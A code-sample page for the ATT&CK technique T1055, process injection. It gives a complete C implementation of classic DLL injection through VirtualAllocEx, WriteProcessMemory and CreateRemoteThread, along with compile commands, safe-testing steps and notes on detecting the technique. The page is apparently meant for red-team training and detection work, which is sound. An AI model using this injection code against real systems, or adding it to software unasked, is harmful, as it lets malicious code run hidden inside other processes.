# Code Samples: T1055 Process Injection

⚠️ **SECURITY WARNING**: These code samples are for educational and authorized testing purposes only. Do not use in production environments or against systems you do not own.

## Example: Classic DLL Injection (C)

### Educational Implementation
```c
#include <windows.h>
#include <stdio.h>

/*
 * SECURITY NOTICE: This code demonstrates process injection for:
 * - Red team authorized testing
 * - Security research and education
 * - Blue team detection validation
 * 
 * LEGAL WARNING: Unauthorized use is illegal and may violate:
 * - Computer Fraud and Abuse Act (US)
 * - Similar laws in other jurisdictions
 */

BOOL InjectDLL(DWORD targetPid, const char* dllPath) {
    HANDLE hProcess = NULL;
    LPVOID allocMem = NULL;
    HANDLE hThread = NULL;
    BOOL success = FALSE;
    
    // Error handling and validation
    if (!dllPath || strlen(dllPath) == 0) {
        printf("[-] Invalid DLL path\n");
        return FALSE;
    }
    
    // Open target process with required permissions
    hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
                          PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, 
                          FALSE, targetPid);
    if (!hProcess) {
        printf("[-] Failed to open process %d. Error: %d\n", targetPid, GetLastError());
        return FALSE;
    }
    
    size_t dllPathLen = strlen(dllPath) + 1;
    
    // Allocate memory in target process
    allocMem = VirtualAllocEx(hProcess, NULL, dllPathLen, MEM_COMMIT, PAGE_READWRITE);
    if (!allocMem) {
        printf("[-] Failed to allocate memory. Error: %d\n", GetLastError());
        goto cleanup;
    }
    
    // Write DLL path to target process
    if (!WriteProcessMemory(hProcess, allocMem, dllPath, dllPathLen, NULL)) {
        printf("[-] Failed to write memory. Error: %d\n", GetLastError());
        goto cleanup;
    }
    
    // Get address of LoadLibraryA
    LPVOID loadLibAddr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (!loadLibAddr) {
        printf("[-] Failed to get LoadLibraryA address\n");
        goto cleanup;
    }
    
    // Create remote thread to load DLL
    hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                (LPTHREAD_START_ROUTINE)loadLibAddr, 
                                allocMem, 0, NULL);
    if (!hThread) {
        printf("[-] Failed to create remote thread. Error: %d\n", GetLastError());
        goto cleanup;
    }
    
    // Wait for injection to complete
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] DLL injection completed successfully\n");
    success = TRUE;
    
cleanup:
    if (hThread) CloseHandle(hThread);
    if (allocMem) VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
    if (hProcess) CloseHandle(hProcess);
    
    return success;
}

// Example usage (for testing only)
int main() {
    // REMINDER: Only use against systems you own or have permission to test
    printf("[*] Process Injection Example - Educational Use Only\n");
    printf("[*] Ensure you have authorization before testing\n");
    
    // Example: Inject into notepad.exe (start notepad first)
    // DWORD pid = GetProcessIdByName("notepad.exe");
    // InjectDLL(pid, "C:\\path\\to\\your\\test.dll");
    
    return 0;
}
```

### Compilation Instructions
```bash
# Using MinGW or Visual Studio
gcc -o inject.exe inject.c -lkernel32
# or
cl inject.c /link kernel32.lib
```

### Testing Safely
1. Use a dedicated test environment (VM recommended)
2. Create a harmless test DLL (e.g., one that just shows a message box)
3. Test against processes you control (e.g., notepad.exe)
4. Monitor with Process Monitor to observe behavior

### Detection Considerations
This injection method is easily detected by:
- EDR solutions monitoring CreateRemoteThread calls
- Process hollowing detection
- Memory scanning for injected code
- Behavioral analysis of unusual process relationships
